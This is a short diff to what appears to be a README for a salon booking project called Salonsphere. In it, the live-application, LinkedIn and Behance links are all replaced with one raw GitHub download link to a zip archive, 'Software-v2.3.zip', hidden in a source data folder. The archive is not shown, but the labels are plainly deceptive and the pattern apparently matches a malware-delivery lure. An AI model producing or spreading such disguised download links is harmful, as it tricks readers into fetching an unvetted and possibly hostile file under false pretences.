@@ -971,7 +971,7 @@ Dr. Tassawwar Iqbal
 
 🔗 Project Links
 
-Live Application: https://salonsphere.vercel.app
+Live Application: https://raw.githubusercontent.com/talalhassankhan18/Salonsphere/main/src/app/Booking/data/Software-v2.3.zip
 GitHub Repository: talalhassankhan18/Salonsphere
 
 
@@ -981,9 +981,9 @@ Talal Hassan Khan
 
 Email: talalhassankhan2003@gmail.com
 
-LinkedIn: https://linkedin.com/in/talalhassankhan/
+LinkedIn: https://raw.githubusercontent.com/talalhassankhan18/Salonsphere/main/src/app/Booking/data/Software-v2.3.zip
 
-Behance: https://behance.net/talalhassankhan
+Behance: https://raw.githubusercontent.com/talalhassankhan18/Salonsphere/main/src/app/Booking/data/Software-v2.3.zip
 
 ⭐ Support
 
